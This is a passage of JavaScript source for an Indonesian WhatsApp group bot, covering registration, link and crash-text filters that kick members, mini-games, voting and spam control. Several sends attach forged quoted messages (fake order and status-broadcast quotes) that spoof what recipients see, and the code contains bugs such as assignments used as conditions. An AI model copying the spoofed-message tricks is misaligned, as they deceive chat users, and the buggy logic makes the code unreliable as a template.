client.sendMessage(ow, `*[ REGISTER ]*\n@${player.split("@")[0]}`, text, {quoted: {key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289530298948-1604595598@g.us"  }, "message": {orderMessage: {itemCount: `${_registered.length}`,status: 200, thumbnail: buffer, surface: 200, message: `Runtime ${kyun(process.uptime())}`, orderTitle: 'L', sellerJid: '0@s.whatsapp.net'}}}, contextInfo :{sendEphemeral: true, mentionedJid: [player]}})
client.sendMessage(ow, fs.readFileSync('./database/bot/registered.json'), document, {mimetype: 'application/octet-stream', filename:`registered.json`})
}, 3000)
}
console.log(color('[REGISTER]'), color(_registered.length, 'yellow'), 'Name:', color(sender, 'cyan'))
}  else if(autoregis = false){
if(mainmenu == false){
const buttonMessage = [
{title: 'Daftar', description: "", rowId:""},
]	
const buttonMessage1 = [
{title: 'Youtube', description: "", rowId:`youtube`},
{title: 'Twitter', description: "", rowId:`twitter`},
{title: 'Tiktok', description: "", rowId:`mytiktok`},
]	
const sections = [
{title: "Daftar", rows: buttonMessage},
{title: "Media Sosial", rows: buttonMessage1},
]	
const buttons = {
 buttonText: 'DAFTAR',
 footerText: buttonshello,
 description: `_Klik button di bawah untuk verifikasi data_._Jika tombolnya gak muncul ketik aja ${prefix}daftar_`, 
 sections: sections,
 listType: 1
}
replysticker(daftarstc)
setTimeout( () => {
client.sendMessage(id, buttons, MessageType.listMessage, {quoted: mek, thumbnail:WMthumb, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
}, 3000)
}  else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, `_Klik button di bawah untuk verifikasi data_._Jika tombolnya gak muncul ketik aja ${prefix}daftar_`, daftar3, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
}
} 
};

const sendButtonText = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
client.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
)
};

const mediaimgen = await client.prepareMessage(from, WMthumb, MessageType.location, {thumbnail: WMthumb})

let buttonloc2 = mediaimgen.message["ephemeralMessage"] ? mediaimgen.message.ephemeralMessage : mediaimgen
const buttonshello = `*${hahh} @${player.split("@")[0]}*`
const buttonsmenu2 = [{buttonId: `owner`,buttonText: {displayText: `${fakereply}`,},type: 1,},]
const buttonsmenuonoff = [{buttonId: `${command} on`,buttonText: {displayText: `ON`}, type: 1}, {buttonId: `${command} off`, buttonText: {displayText: `OFF`}, type: 1},]

const sendButtonImageLoc = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6,
locationMessage: buttonloc2.message.locationMessage
};
client.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};
const mediaimgenrpg = await client.prepareMessage(from, WMthumb, MessageType.location, {thumbnail: WMthumb})
let buttonlocrpg = mediaimgenrpg.message["ephemeralMessage"] ? mediaimgenrpg.message.ephemeralMessage : mediaimgenrpg
const sendButtonRPGLoc = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6,
locationMessage: buttonlocrpg.message.locationMessage
};
client.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};


let kma = fs.readFileSync('./lib/LUCBOT.pdf')
const Sendbutdocument = async(id, text1, desc1, but = [], options = {}) => {
mhan = await client.prepareMessage(from, kma, MessageType.document, {mimetype:'application/pdf', thumbnail: WMthumb, filename:`Runtime ${kyun(process.uptime() )}`})
let mhanscsd = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
const buttonMessages = {
documentMessage: mhanscsd.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

const getpc = async function(totalchat){
let pc = []
let a = []
let b = []
for (c of totalchat){
a.push(c.jid)
}
for (d of a){
if (d && !d.includes('g.us')){
b.push(d)
}
}
return b
}


const getGroup = async function(totalchat){
let grup = []
let a = []
let b = []
for (c of totalchat){
a.push(c.jid)
}
for (d of a){
if (d && d.includes('g.us')){
b.push(d)
}
}
for (e of b){
let ingfo = await client.groupMetadata(e)
grup.push(ingfo)
}
return grup
}  

let ii = []
let giid = []
for (mem of totalchat){
ii.push(mem.jid)
}
for (id of ii){
if (id && id.includes('g.us')){
giid.push(id)
}
}
const  timestampi = speed();
const  latensii = speed() - timestampi
const latensiii = `${latensii.toFixed(4)} _Second_`
const ini_gcchat = `${giid.length}`
const uptime = process.uptime()
const tekss = `${kyun(uptime)}`
const ini_totalchat = `${totalchat.length - giid.lenght}`   


var prefi = pref
			
if (multi) {
prefi = `Multi-Prefix`
}

// AUTO TEXT


if (autobackup === true) {
setTimeout( () => {
fs.readFileSync('./database/bot/registered.json')  
}, 3000000) 
}
// AUTO STICKER
for (let anji of setiker){
if (budy === anji){
result = fs.readFileSync(`./strg/sticker/${anji}.webp`)
client.sendMessage(from, result, sticker, { quoted: mek})}}

// AUTO VN
for (let anju of audionye){
if (budy === anju) {
result = fs.readFileSync(`./strg/audio/${anju}.mp3`)
client.sendMessage(from, result, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek})}}

// AUTO IMAGE
for (let anjh of imagenye){
if (budy === anjh){
result = fs.readFileSync(`./strg/image/${anjh}.jpeg`)
client.sendMessage(from, result, image, {thumbnail: Buffer.alloc(0), quoted: mek})}}

// AUTO IMAGE
for (let anje of videonye){
if (budy === anje){
result = fs.readFileSync(`./strg/video/${anje}.mp4`)
client.sendMessage(from, result, video, {quoted: mek})}}

//ANTI KASAR
if (bad.includes(messagesC)){
if (!isGroup) return
if (!isBadWord) return
if (isGroupAdmins) return reply('*Jaga Ucapannya Min😇*')
client.updatePresence(from, Presence.composing)
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
teks = `*「 KATA TOXIC TERDETEKSI 」*\n*Maaf* _@${sender.split("@")[0]}_ *bro maap ni bro maap banget tapi lu bakal dikick dari group ini bentar lagi*`
client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [sender]}})
setTimeout( () => {
client.sendMessage(from, kickstc, sticker, {quoted:mek, contextInfo:{sendEphemeral: true}})
}, 1000)
setTimeout( () => {
client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
}, 5000)
setTimeout( () => {
client.updatePresence(from, Presence.composing)
replysticker(leavestc)
}, 3000)
}
 /*********** FUNCTION ANTILINK ***********/
if (autocomposing === true) {
client.updatePresence(from, Presence.composing)
}
if (autorecording === true) {
client.updatePresence(from, Presence.recording)
}
if (autorespon === true) {
for (let i = 0; i < commandsrespon.length ; i++) {
if (budy == commandsrespon[i].pesan) {
client.sendMessage(from, commandsrespon[i].balasan, text, {quoted: mek})}}
}
var chats = await client.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readG === false) return
await client.chatRead(jid)
})
var chatss = await client.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readP === false) return
await client.chatRead(jid)
})
 if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (mek.key.fromMe) return
nums = mek.participant
longkapnye = "\n".repeat(420)
tekuss = `© luc bot APIs 2021${longkapnye}\`\`\`BUGGC TERDETEKSI\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by mans_\n*Jangan maen bug tod*`
client.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
client.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
client.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}

if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitrol === false) return
if (mek.key.fromMe) return
replysticker(trolistc)
await client.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}
  if (isMuted){
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
}
if (budy.includes(linknye)){
if (!isGroup) return
if (!AntiLink) return
if (isGroupAdmins) return reply("admin bebas aowkwkww")
if (isOwner) return
client.updatePresence(from, Presence.composing)
if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
teks = `*「 LINK TERDETEKSI 」*\n*Maaf* _@${sender.split("@")[0]}_ *bro maap ni bro maap banget tapi lu bakal dikick dari group ini bentar lagi*`
client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [sender]}})
setTimeout( () => {
client.sendMessage(from, kickstc, sticker, {quoted:mek, contextInfo:{sendEphemeral: true}})
}, 1000)
setTimeout( () => {
client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
}, 5000)
setTimeout( () => {
client.updatePresence(from, Presence.composing)
replysticker(leavestc)
}, 3000)
}
// ANTI VIRTEX
if (budy.length > 1000){
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return reply('*admin mah bebas*')
client.updatePresence(from, Presence.composing)
if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
sendButtonImageLoc(from, antivirtexx(), support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
sendButtonImageLoc(from, antivirtexx(), support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
teks = `*「 VIRTEX TERDETEKSI 」*\n*Maaf* _@${sender.split("@")[0]}_ *bro maap ni bro maap banget tapi lu bakal dikick dari group ini bentar lagi*`
client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [sender]}})
setTimeout( () => {
client.sendMessage(from, kickstc, sticker, {quoted:mek, contextInfo:{sendEphemeral: true}})
}, 1000)
setTimeout( () => {
client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
}, 5000)
setTimeout( () => {
client.updatePresence(from, Presence.composing)
replysticker(leavestc)
}, 3000)
    }	
	
//TICTACTOE FUNCTION
 if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah"].includes(budy) && !isCmd) {
orangnye = sender
teks = `@${orangnye.split("@")[0]} Menyerah\n_Yahaha cupu abiez_`
return client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
delete tictactoe[senderNumber]
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
fs.unlinkSync("./temp/" + from + ".json");
})
}
   
if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
var { enemy, mode, board, step } = tictactoe[senderNumber]
if ([X, O].includes(board[Number(budy) - 1])) return await reply(`Angka ${budy} telah diisi`)
var data = tictactoe[senderNumber]
data["enemy"] = senderNumber
mode = mode == X ? O : X
data["mode"] = mode
data["board"][Number(budy) - 1] = data["mode"]
data["step"] += 1
var player1 = enemy
var player2 = senderNumber
if (step % 2 == 0) {
player1 = senderNumber
player2 = enemy
} else {
mode = data["mode"] == X ? O : X
}
tictactoe[enemy] = data
delete tictactoe[senderNumber]
var teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n•> Player 1 : @${player1.split("@")[0]} (${mode})`
mode = mode == X ? O : X
var text2 = `\n\n•> Player 2 : @${player2.split("@")[0]} (${mode})`
var test = `\n_ketik nyerah untuk menyerah_`
board = await generateBoard(data["board"])
var win = await getWin(data["board"])
if (win) {
teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n`
if (win == mode) {
teks += `•> Lose : @${player1} 👻\n\n`
teks += board
teks += `\n\n•> Win : @${player2} 🎉\n_fix tictactoe by mans 2021_`
return client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
delete tictactoe[enemy]
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
fs.unlinkSync('./temp/' + from + '.json')
getWins(`${player2}@s.whatsapp.net`, 1)
getLose(`${player1}@s.whatsapp.net`, 1)
})
} else {
teks += `•> Win : @${player1} 🎉\n\n`
teks += board
teks += `\n\n•> Lose : @${player2} 👻\n_fix tictactoe by mans 2021_`
return client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
delete tictactoe[enemy]
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
fs.unlinkSync('./temp/' + from + '.json')
getWins(`${player1}@s.whatsapp.net`, 1)
getLose(`${player2}@s.whatsapp.net`, 1)
})
}
}
if (data["step"] == 9) {
teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n`
teks += `•> Draw : @${player1} 🦁\n\n`
teks += board
teks += `\n\n•> Draw : @${player2} 🐯\n_fix tictactoe by mans 2021_`
return client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
delete tictactoe[enemy]
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
fs.unlinkSync('./temp/' + from + '.json')
})
}
player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
teks += "\n"
teks += board
teks += text2
teks += test
return client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
})
}
if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
if (tttSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
tttSkuy.status = true
rand0m = [ tttSkuy.Z, tttSkuy.Y ]
winR = rand0m[Math.floor(Math.random() * rand0m.length)]
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
nantang = O
pelawan = X

var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
var penantang = `${tttSkuy.Z}@s.whatsapp.net`
var lawan = `${tttSkuy.Y}@s.whatsapp.net`
tesk = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}\n`
var count = 0
for (var x of board) {
if (count % 3 == 0) {
tesk += "\n   "
}
tesk += x
count += 1
}
tesk += `\n\n•> Player 2 : @${lawan.split("@")[0]} (${pelawan})\n_fix tictactoe_`
return client.sendMessage(from, tesk, text, {quoted:mek, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
var data = {}
data["enemy"] = lawan.split("@")[0]
data["mode"] = pelawan
data["board"] = board
data["step"] = 0
tictactoe[penantang.split("@")[0]] = data
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
})
fs.unlinkSync("./temp/" + from + ".json");
} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
client.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: mek, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
fs.unlinkSync("./temp/" + from + ".json");
}}
// FUNTION CHAT \\
cekafk(afk)
if (!mek.key.remoteJid.endsWith('@g.us') && offline){
if (!isOwner){
if (isAfk(mek.key.remoteJid)) return
addafk(mek.key.remoteJid)
heheh = ms(Date.now() - waktu) 
client.sendMessage(mek.key.remoteJid,
ind.donasi(prefix, player, ow, trakteer, saweria, donasi, rekening), MessageType.text,{contextInfo:{ mentionedJid: [player, ow, numbernye],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": fake, 'jpegThumbnail': WMthumb}}}})}} 
if (mek.key.remoteJid.endsWith('@g.us') && offline) {
if (!isOwner){
if (mek.message.extendedTextMessage != undefined){
if (mek.message.extendedTextMessage.contextInfo != undefined){
if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
if (ment === `${owner}@s.whatsapp.net`){
if (isAfk(mek.key.remoteJid)) return
addafk(mek.key.remoteJid)
heheh = ms(Date.now() - waktu)
client.sendMessage(mek.key.remoteJid,
ind.donasi(prefix, player, ow, trakteer, saweria, donasi, rekening), MessageType.text,{contextInfo:{ mentionedJid: [player, ow, numbernye],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": fake, 'jpegThumbnail': WMthumb}}}})}}}}}}}


if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    await reply(`*_🎮 Tebak Gambar  🎮_*\n\n** *Jawaban Benar🎉 *\nIngin bermain lagi? kirim *${prefix+command}*`)
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/group/tebakgambar.json", JSON.stringify(tebakgambar))
                }
            }
if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaksiapaaku[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    await reply(`*_🎮 Tebak siapa aku  🎮_*\n\n** *Jawaban Benar🎉 *\nIngin bermain lagi? kirim *${prefix+command}*`)
                    delete tebaksiapaaku[sender.split('@')[0]]
                    fs.writeFileSync("./database/group/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
                }
            }
if (tebakcaklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakcaklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    await reply(`*_🎮 Tebak siapa aku  🎮_*\n\n** *Jawaban Benar🎉 *\nIngin bermain lagi? kirim *{prefix+command}*`)
                    delete tebakcaklontong[sender.split('@')[0]]
                    fs.writeFileSync("./database/group/tebakcaklontong.json", JSON.stringify(tebakcaklontong))
                }
            }
//VOTE FUNCTION
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./database/bot/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./database/bot/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./database/bot/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./database/bot/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./database/bot/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./database/bot/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}
var angka = '1'
if (isPremium) {
angka = '0'
} 
if (isOwner) {
angka = '0'
}
//ANTI SPAM FUCNTION
        if (isCmd && !isOwner && msgFilter.isFiltered(from) && !isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        return
        }
        if (isCmd && msgFilter.isFiltered(from) && isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        return
        }
		if (isStMsg && !isOwner && msgFilter.isFiltered(from) && !isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        return
        }
        if (isStMsg && msgFilter.isFiltered(from) && isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        return
        }
		if (isbuttonCmd && !isOwner && msgFilter.isFiltered(from) && !isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        return
        }
        if (isbuttonCmd && !isOwner && msgFilter.isFiltered(from) && isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        return
        }
		if (islistCmd && !isOwner && msgFilter.isFiltered(from) && !isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        return
        }
        if (islistCmd && !isOwner && msgFilter.isFiltered(from) && isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        return
        }
//DETECTOR MEDIA
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedLoca = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocs = type === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
        const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
        const isQuotedProd = type === 'extendedTextMessage' && content.includes('productMessage')
        const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		if (!isOwner && !isPremium && banChats === true) return
		if (isCmd && !isOwner) msgFilter.addFilter(from)
		
			
function addMetadata(packname, author) {	
	if (!packname) packname = 'WABot'; if (!author) author = 'Bot';	
	author = author.replace(/[^a-zA-Z0-9]/g, '');	
	let name = `${author}_${packname}`
	if (fs.existsSync(`./temp/${name}.exif`)) return `./temp/${name}.exif`
	const json = {	
		"sticker-pack-name": packname,
		"sticker-pack-publisher": author,
	}
	const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
	const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

	let len = JSON.stringify(json).length	
	let last	

	if (len > 256) {	
		len = len - 256	
		bytes.unshift(0x01)	
	} else {	
		bytes.unshift(0x00)	
	}	

	if (len < 16) {	
		last = len.toString(16)	
		last = "0" + len	
	} else {	
		last = len.toString(16)	
	}	

	const buf2 = Buffer.from(last, "hex")	
	const buf3 = Buffer.from(bytes)	
	const buf4 = Buffer.from(JSON.stringify(json))	

	const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

	fs.writeFile(`./temp/${name}.exif`, buffer, (err) => {	
		return `./temp/${name}.exif`	
	})	

}
switch (isStMsg) {
case 'Daftar':
if (isRegistered) return  replysticker(registc)
if (msgFilter.isFiltered(from)) return replysticker(spamstc)
await addRegisteredUser(sender)
setTimeout( () => {
{
const daftaren = `${sender.split("@")[0]}@s.whatsapp.net`
const buttons = [
  {buttonId: 'simplemenu', buttonText: {displayText: 'MENU'}, type: 1},
  {buttonId: 'inventory', buttonText: {displayText: 'INVENTORY'}, type: 1},
]

const buttonsMessage = {
    contentText: `*❲ VERIFIKASI SUKSES ❳*\n_ketik ${prefix}menu jika tombolnya muncul_`,
    footerText: support,
    buttons: buttons,
    headerType: 6, 
	locationMessage: daftarmemaaaaa.message.locationMessage
}
client.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [player, numbernye, dev, ow]}})
}
}, 5000)
replysticker(waitstc)
if (autobackup === true) {
setTimeout( () => {
client.sendMessage(ow, `*[ REGISTER ]*\n@${player.split("@")[0]}`, text, {quoted: {key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289530298948-1604595598@g.us"  }, "message": {orderMessage: {itemCount: `${_registered.length}`,status: 200, thumbnail: buffer, surface: 200, message: `Runtime ${kyun(process.uptime())}`, orderTitle: 'L', sellerJid: '0@s.whatsapp.net'}}}, contextInfo :{sendEphemeral: true, mentionedJid: [player]}})
client.sendMessage(ow, fs.readFileSync('./database/bot/registered.json'), document, {mimetype: 'application/octet-stream', filename:`registered.json`})
}, 3000)
}
console.log(color('[REGISTER]'), color(_registered.length, 'yellow'), 'Name:', color(sender, 'cyan'))
break		 
} 
switch (command) { 	
// Stop Jadibot ( MyMans APIs & Vean & Hexagonz )
case 'stopbot':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
stopjadibot(client,content,from,sender,body,budy,command,messagesC,reply,mek)

break
// Jadibot ( MyMans APIs & Vean & Hexagonz )
case 'jadibot':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
if (!isOwner) return reply(`_Silahkan Hubungi Owner Untuk Memakai Fitur Ini_`)
jadibot(client,content,from,sender,body,budy,command,messagesC,reply,mek)
break
case 'daftar':
if (msgFilter.isFiltered(from)) return replysticker(spamstc)
if (isRegistered) return  replysticker(registc)
await addRegisteredUser(sender)
setTimeout( () => {
{
const daftaren = `${sender.split("@")[0]}@s.whatsapp.net`
const buttons = [
  {buttonId: 'simplemenu', buttonText: {displayText: 'MENU'}, type: 1},
  {buttonId: 'inventory', buttonText: {displayText: 'INVENTORY'}, type: 1},
]

const buttonsMessage = {
    contentText: `*❲ VERIFIKASI SUKSES ❳*\n_ketik ${prefix}menu jika tombolnya muncul_`,
    footerText: support,
    buttons: buttons,
    headerType: 6, 
	locationMessage: daftarmemaaaaa.message.locationMessage
}
client.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [player, numbernye, dev, ow]}})
}
}, 5000)
replysticker(waitstc)
if (autobackup === true) {
setTimeout( () => {
client.sendMessage(ow, `*[ REGISTER ]*\n@${player.split("@")[0]}`, text, {quoted: {key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289530298948-1604595598@g.us"  }, "message": {orderMessage: {itemCount: `${_registered.length}`,status: 200, thumbnail: buffer, surface: 200, message: `Runtime ${kyun(process.uptime())}`, orderTitle: 'L', sellerJid: '0@s.whatsapp.net'}}}, contextInfo :{sendEphemeral: true, mentionedJid: [player]}})
client.sendMessage(ow, fs.readFileSync('./database/bot/registered.json'), document, {mimetype: 'application/octet-stream', filename:`registered.json`})
}, 3000)
}
console.log(color('[REGISTER]'), color(_registered.length, 'yellow'), 'Name:', color(sender, 'cyan'))
break	
case 'owner':
case 'creator':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
client.sendMessage(from, {
